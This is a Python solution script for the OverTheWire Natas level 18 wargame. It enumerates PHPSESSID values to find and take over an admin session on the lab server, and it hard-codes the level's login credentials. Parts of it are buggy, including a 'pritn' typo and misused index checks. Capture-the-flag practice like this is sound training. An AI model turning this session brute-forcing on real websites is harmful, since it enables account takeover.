import requests
from requests.auth import HTTPBasicAuth
from requests.sessions import RequestsCookieJar


def receive_response(_payload):
    # cookies={'PHPSESSID':'507'}
    auth_username = 'natas18'
    auth_password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
    response = requests.post('http://natas18.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data=_payload)
    return response

# receive a requests.Response object and dissect it
def dissect_response(response):

    print("Encoding: " + response.apparent_encoding)
    print("-----------------------")
    print("Content: " + str(response.content))
    print("-----------------------")
    print("Cookies: " + str(response.cookies))
    print("-----------------------")
    print("Elapsed time: " + str(response.elapsed))
    print("-----------------------")
    print("Encoding: " + str(response.encoding))
    print("-----------------------")
    print("Headers: " + str(response.headers))
    print("-----------------------")
    print("History: " + str(response.history))
    print("-----------------------")
    try:
        print("JSON: " + str(response.json()))
    except:
        pass
    print("-----------------------")
    print("Links: " + str(response.links))
    print("-----------------------")
    print("Next: " + str(response.next))
    print("-----------------------")
    print("OK:" + str(response.ok))
    print("-----------------------")
    print("Raw: " + str(response.raw))
    print("-----------------------")
    print("Reason: " + str(response.reason))
    print("-----------------------")
    print("Status code: " + str(response.status_code))
    print("-----------------------")
    print("Text: " + str(response.text))
    print("-----------------------")
    print("URL: " + str(response.url))


def session_handling():
    
    sess = requests.Session()
    auth_username = 'natas18'
    auth_password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
    _payload = {'username':'nimish', 'password':'nimish'}
    
    # response = sess.get('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password))
    # dissect_response(response)

    response = sess.post('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password), data= _payload)
    
    for i in range(1, 461):
        new_cookie = RequestsCookieJar()
        new_cookie.set(name="PHPSESSID", value=str(i), domain='natas18.natas.labs.overthewire.org', path="/")
        sess.cookies.update(new_cookie)
        response = sess.get('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password))

        try:
            response.text.index("are logged in as a regular")
            print(str(i) + " non admin account")
        except:
            print(str(i) + " admin account ")
            print(response.text)
            break
    


    
def brute_force_sess_id():
    for i in range(1, 641):
   
        auth_username = 'natas18'
        auth_password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
        _payload = {'username': '' , 'password': ''}
        response = requests.get('http://natas18.natas.labs.overthewire.org/index.php?PHPSESSID='+str(i), auth=HTTPBasicAuth(auth_username, auth_password))
        text = response.text
        try:
            dissect_response(response)
            if(text.index("Please login with your admin account")):
                print(str(i) + " non admin account")
            else:
                print(str(i) + " admin account ")
                break
        except:
            pass


def brute_force_sess_id_in_cookie():
    auth_username = 'natas18'
    auth_password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
    _payload = {'username': '' , 'password': ''}
    for i in range(1, 641):
        cookie = {'PHPSESSID':str(i)}
        response = requests.post('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password), cookies=cookie, data=_payload)
        text = response.text
        for cookie in response.cookies:
            print(cookie.name)
            print(cookie.value)
            print(cookie.domain)
            pritn(cookie.path)
        try:
            if(text.index("Login as an admin")):
                print(str(i) + " non admin account")
            else:
                print(str(i) + " admin account ")
                break
        except:
            pass

session_handling()
# brute_force_sess_id()
# brute_force_sess_id_in_cookie()